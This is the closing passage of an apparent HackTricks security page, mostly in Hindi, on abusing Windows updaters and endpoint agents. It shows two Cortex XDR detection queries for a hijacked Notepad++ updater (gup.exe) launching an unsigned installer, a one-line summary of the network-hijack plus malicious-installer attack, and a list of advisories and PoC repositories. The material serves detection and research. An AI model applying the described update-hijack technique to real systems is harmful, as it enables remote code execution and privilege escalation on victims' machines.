| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> द्वारा गैर-Notepad++ इंस्टॉलर लॉन्च करना</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

ये तरीके ऐसे किसी भी updater पर लागू होते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में विफल रहता है—network hijack + malicious installer + BYO-signed sideloading से “विश्वसनीय” updates की आड़ में remote code execution मिलता है।

---
## References
- [1] [Advisory – Windows के लिए Netskope Client – Rogue Server के ज़रिए Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre और Razer Synapse 4 को Pwning करना](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent में writable files के ज़रिए Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent में Privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors द्वारा Notepad++ Supply Chain का शोषण](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure घटना पर अपडेट](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows के लिए Netskope Client में CVE-2025-0309 के fix को bypass करना](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage में Privilege Escalation Bugs का पता लगाना](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
